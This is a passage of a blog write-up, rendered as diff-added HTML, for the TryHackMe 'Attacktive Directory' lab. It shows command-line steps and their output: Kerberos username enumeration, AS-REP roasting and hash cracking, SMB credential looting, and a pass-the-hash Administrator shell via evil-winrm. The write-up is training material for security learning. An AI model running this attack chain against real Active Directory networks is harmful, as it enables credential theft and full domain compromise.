+S-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\*unknown* (8)
+[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
+S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
+S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
+S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
+S-1-5-21-3591857110-2884097990-301047963-503 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-504 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-505 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-506 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-507 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-508 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-509 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-510 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-511 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
+S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-529 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-530 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-531 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-532 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-533 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-534 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-535 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-536 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-537 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-538 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-539 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-540 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-541 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-542 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-543 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-544 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-545 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-546 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-547 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-548 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-549 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
+S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)
+
+ ================================================ 
+|    Getting printer info for spookysec.local    |
+ ================================================ 
+Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Fri Apr 17 13:16:10 2020
+
+root@kali:~# </code></pre><p>We gathered a lot of data that gave us more idea about the targeted AD since our tool failed to gain any credentials or usernames we will do that the hard way {Bruteforcing}, the next tool we'll be using is very powerful created by <strong>Ronnie Flathers</strong>, I would suggest checking the details about the tool on github, I'll leave the link at the end.</p><blockquote>Let's get some usernames!</blockquote><pre><code>root@kali:~# kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 04/17/20 - Ronnie Flathers @ropnop
+
+2020/04/17 13:17:24 &gt;  Using KDC(s):
+2020/04/17 13:17:24 &gt;   spookysec.local:88
+
+2020/04/17 13:17:24 &gt;  [+] VALID USERNAME:       james@spookysec.local
+2020/04/17 13:17:24 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
+2020/04/17 13:17:24 &gt;  [+] VALID USERNAME:       James@spookysec.local
+2020/04/17 13:17:24 &gt;  [+] VALID USERNAME:       robin@spookysec.local
+2020/04/17 13:17:24 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local
+2020/04/17 13:17:24 &gt;  [+] VALID USERNAME:       administrator@spookysec.local
+2020/04/17 13:17:24 &gt;  [+] VALID USERNAME:       backup@spookysec.local
+2020/04/17 13:17:24 &gt;  [+] VALID USERNAME:       paradox@spookysec.local
+2020/04/17 13:17:25 &gt;  [+] VALID USERNAME:       JAMES@spookysec.local
+2020/04/17 13:17:25 &gt;  [+] VALID USERNAME:       Robin@spookysec.local
+2020/04/17 13:17:27 &gt;  [+] VALID USERNAME:       Administrator@spookysec.local
+2020/04/17 13:17:29 &gt;  [+] VALID USERNAME:       Darkstar@spookysec.local
+2020/04/17 13:17:30 &gt;  [+] VALID USERNAME:       Paradox@spookysec.local
+2020/04/17 13:17:33 &gt;  [+] VALID USERNAME:       DARKSTAR@spookysec.local
+2020/04/17 13:17:34 &gt;  [+] VALID USERNAME:       ori@spookysec.local
+2020/04/17 13:17:35 &gt;  [+] VALID USERNAME:       ROBIN@spookysec.local
+2020/04/17 13:17:44 &gt;  Done! Tested 100000 usernames (16 valid) in 20.383 seconds
+root@kali:~# </code></pre><p>The next step we will use GetNPUsers.py from Impacket to retrieve kerberos ticket and try to decrypt it.</p><pre><code>root@kali:~# find / -type f -name 'GetNPUsers.py'
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py
+root@kali:~# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx03300355dc7659423fe0e31a657e0b4c0b7e5b01803004807927ddaa362d14f16fa0f994cdafa7c6bae1ad9ffe50b362391fb16760cfa776f25a9c3b9edbd9784e68275d1d7e39d83688a78653c58d41622695800187dbbc87dd923e1e7eaf70a6a25bb0eabee8656ee3873d5be19e6e2b5a6f858a761a66b385f606d7fbb3e557d222d991fbd3a0fec7ce29db064500576c48881a9f4793259f3fbb8c79bd3dc8de6cd92fe64d30ea6e9e299d5335f115e201c1d9d7f7ec81c5d5663b926ee17c61ac742247762eca95393af92a57b07dbfcf5e8b5d45b1058d4ca2ac879556025d3247630cc43c033b7f672c8fe
+root@kali:~#</code></pre><figure class="kg-card kg-code-card"><pre><code>root@kali:~# john kerbhash --wordlist=/root/passwordlist.txt 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+mxxxxxxxxxxxxx   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
+1g 0:00:00:00 DONE (2020-04-17 13:20) 33.33g/s 221866p/s 221866c/s 221866C/s horoscope..amy123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@kali:~#</code></pre><figcaption>The password list and users are available in the challenge room</figcaption></figure><p>after getting the credentials of svc-admin, we'll move on checking the shared file with the user and look for anything that we can use, listing the files show us a backup file, that backup file after downloading it will contain an encoded base64, decoding it will give us back another user credentials.</p><pre><code>root@kali:~# smbmap -H spookysec.local -d spookysec.local -u svc-admin -p mxxxxxxxxxxxxx
+[+] Finding open SMB ports....
+[+] User SMB session established on spookysec.local...
+[+] IP: spookysec.local:445     Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        .                                                  
+        dr--r--r--                0 Sat Apr  4 19:08:39 2020    .
+        dr--r--r--                0 Sat Apr  4 19:08:39 2020    ..
+        fr--r--r--               48 Sat Apr  4 19:08:53 2020    backup_credentials.txt
+        backup                                                  READ ONLY
+        C$                                                      NO ACCESS       Default share
+        .                                                  
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    InitShutdown
+        fr--r--r--                4 Mon Jan  1 00:00:00 1601    lsass
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    ntsvcs
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    scerpc
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-3e8-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    epmapper
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-290-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    LSM_API_service
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    eventlog
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-428-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    TermSrv_API_service
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    Ctx_WinStation_API_service
+        fr--r--r--                4 Mon Jan  1 00:00:00 1601    wkssvc
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-30c-0
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-30c-1
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    SessEnvPublicRpc
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    atsvc
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-3b8-0
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-710-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\49671
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    72bba0c63ba338fa
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\593
+        fr--r--r--                4 Mon Jan  1 00:00:00 1601    srvsvc
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    spoolss
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-880-0
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    netdfs
+        fr--r--r--                3 Mon Jan  1 00:00:00 1601    W32TIME_ALT
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-2fc-0
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-9d8-0
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-97c-0
+        IPC$                                                    READ ONLY       Remote IPC
+        .                                                  
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    .
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    ..
+        NETLOGON                                                READ ONLY       Logon server share 
+        .                                                  
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    .
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    ..
+        dr--r--r--                0 Sat Apr  4 18:39:35 2020    spookysec.local
+        SYSVOL                                                  READ ONLY       Logon server share 
+root@kali:~#</code></pre><pre><code>msf5 auxiliary(admin/smb/download_file) &gt; show options 
+
+Module options (auxiliary/admin/smb/download_file):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   FILE_RPATHS                   no        A file containing a list remote files relative to the share to operate on
+   RHOSTS       spookysec.local  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPATH        backup_credentials.txt       no        The name of the remote file relative to the share to operate on
+   RPORT        445              yes       The SMB service port (TCP)
+   SMBDomain    spookysec.local  no        The Windows domain to use for authentication
+   SMBPass      mxxxxxxxxxxxxx   no        The password for the specified username
+   SMBSHARE     backup           yes       The name of a share on the RHOST
+   SMBUser      svc-admin        no        The username to authenticate as
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+
+msf5 auxiliary(admin/smb/download_file) &gt; run
+
+[+] 10.10.237.175:445     - backup_credentials.txt saved as: /root/.msf4/loot/20200417133840_default_10.10.237.175_smb.shares.file_838056.txt
+[*] spookysec.local:445   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(admin/smb/download_file) &gt;</code></pre><p>with the password of backup user we can dump domain controller users hashes</p><figure class="kg-card kg-image-card"></figure><p>the next step we can either decrypt the NTLM hash and connect to Administrator, or use the beautiful piece of code evil-winrm, feel free to check the Github repository and read more about how the tool works, Links at the end of the article.</p><pre><code>root@kali:~# git clone https://github.com/Hackplayers/evil-winrm.git
+Cloning into 'evil-winrm'...
+remote: Enumerating objects: 72, done.
+remote: Counting objects: 100% (72/72), done.
+remote: Compressing objects: 100% (58/58), done.
+remote: Total 772 (delta 38), reused 32 (delta 14), pack-reused 700
+Receiving objects: 100% (772/772), 1.92 MiB | 1.87 MiB/s, done.
+Resolving deltas: 100% (443/443), done.
+root@kali:~# gem install evil-winrm
+Fetching: builder-3.2.4.gem (100%)
+Successfully installed builder-3.2.4
+Fetching: erubi-1.9.0.gem (100%)
+Successfully installed erubi-1.9.0
+Fetching: gssapi-1.3.0.gem (100%)
+Successfully installed gssapi-1.3.0
+Fetching: gyoku-1.3.1.gem (100%)
+Successfully installed gyoku-1.3.1
+Fetching: httpclient-2.8.3.gem (100%)
+Successfully installed httpclient-2.8.3
+Fetching: multi_json-1.14.1.gem (100%)
+Successfully installed multi_json-1.14.1
+Fetching: little-plugger-1.1.4.gem (100%)
+Successfully installed little-plugger-1.1.4
+Fetching: logging-2.2.2.gem (100%)
+Successfully installed logging-2.2.2
+Fetching: nori-2.6.0.gem (100%)
+Successfully installed nori-2.6.0
+Fetching: rubyntlm-0.6.2.gem (100%)
+Successfully installed rubyntlm-0.6.2
+Fetching: winrm-2.3.4.gem (100%)
+Successfully installed winrm-2.3.4
+Fetching: winrm-fs-1.3.4.gem (100%)
+Successfully installed winrm-fs-1.3.4
+Fetching: stringio-0.1.0.gem (100%)
+Building native extensions. This could take a while...
+Successfully installed stringio-0.1.0
+Fetching: evil-winrm-2.3.gem (100%)
+Happy hacking! :)
+Successfully installed evil-winrm-2.3
+Parsing documentation for builder-3.2.4
+Installing ri documentation for builder-3.2.4
+Parsing documentation for erubi-1.9.0
+Installing ri documentation for erubi-1.9.0
+Parsing documentation for gssapi-1.3.0
+Installing ri documentation for gssapi-1.3.0
+Parsing documentation for gyoku-1.3.1
+Installing ri documentation for gyoku-1.3.1
+Parsing documentation for httpclient-2.8.3
+Installing ri documentation for httpclient-2.8.3
+Parsing documentation for multi_json-1.14.1
+Installing ri documentation for multi_json-1.14.1
+Parsing documentation for little-plugger-1.1.4
+Installing ri documentation for little-plugger-1.1.4
+Parsing documentation for logging-2.2.2
+Installing ri documentation for logging-2.2.2
+Parsing documentation for nori-2.6.0
+Installing ri documentation for nori-2.6.0
+Parsing documentation for rubyntlm-0.6.2
+Installing ri documentation for rubyntlm-0.6.2
+Parsing documentation for winrm-2.3.4
+Installing ri documentation for winrm-2.3.4
+Parsing documentation for winrm-fs-1.3.4
+Installing ri documentation for winrm-fs-1.3.4
+Parsing documentation for stringio-0.1.0
+Installing ri documentation for stringio-0.1.0
+Parsing documentation for evil-winrm-2.3
+Installing ri documentation for evil-winrm-2.3
+Done installing documentation for builder, erubi, gssapi, gyoku, httpclient, multi_json, little-plugger, logging, nori, rubyntlm, winrm, winrm-fs, stringio, evil-winrm after 6 seconds
+14 gems installed
+root@kali:~#</code></pre><pre><code>root@kali:~# evil-winrm -i 10.10.237.175 -u Administrator -H e48xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+thm-ad\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre><p>And here we go Administrator user, there isn't much we can't do now ... </p><amp-iframe src="https://giphy.com/embed/8EmeieJAGjvUI" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen sandbox="allow-scripts allow-same-origin" layout="responsive"></amp-iframe><p><a href="https://giphy.com/gifs/work-homer-simpson-8EmeieJAGjvUI"></a></p><p>Happy Hacking!</p><p></p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/ropnop/kerbrute"><div class="kg-bookmark-content"><div class="kg-bookmark-title">ropnop/kerbrute</div><div class="kg-bookmark-description">A tool to perform Kerberos pre-auth bruteforcing. Contribute to ropnop/kerbrute development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" width="32" height="32" layout="fixed"></amp-img><span class="kg-bookmark-author">ropnop</span><span class="kg-bookmark-publisher">GitHub</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://avatars2.githubusercontent.com/u/2555506?s=400&amp;v=4" width="167" height="167" layout="fixed"></amp-img></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/Hackplayers/evil-winrm"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Hackplayers/evil-winrm</div><div class="kg-bookmark-description">The ultimate WinRM shell for hacking/pentesting. Contribute to Hackplayers/evil-winrm development by creating an account on GitHub.</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" width="32" height="32" layout="fixed"></amp-img><span class="kg-bookmark-author">Hackplayers</span><span class="kg-bookmark-publisher">GitHub</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://repository-images.githubusercontent.com/189010173/9da36880-c2d7-11e9-8037-2feff48b35d9" width="1280" height="640" layout="responsive"></amp-img></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/SecureAuthCorp/impacket"><div class="kg-bookmark-content"><div class="kg-bookmark-title">SecureAuthCorp/impacket</div><div class="kg-bookmark-description">Impacket is a collection of Python classes for working with network protocols. - SecureAuthCorp/impacket</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://github.githubassets.com/favicons/favicon.svg" width="32" height="32" layout="fixed"></amp-img><span class="kg-bookmark-author">SecureAuthCorp</span><span class="kg-bookmark-publisher">GitHub</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://avatars2.githubusercontent.com/u/9470173?s=400&amp;v=4" width="400" height="400" layout="responsive"></amp-img></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/room/attacktivedirectory"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | Attacktive Directory</div><div class="kg-bookmark-description">99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?</div><div class="kg-bookmark-metadata"><amp-img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" width="552" height="564" layout="responsive"></amp-img><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><amp-img src="https://tryhackme-images.s3.amazonaws.com/room-icons/62d83f3931e968e92e06138a72ce44f0.png" width="918" height="918" layout="responsive"></amp-img></div></a></figure>
+
+            </section>
+
+        </article>
+    </main>
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="../../">fr33s0ul</a> © 2020</section>
+        <section class="poweredby">Proudly published with <a href="https://ghost.org">Ghost</a></section>
+    </footer>
+</body>
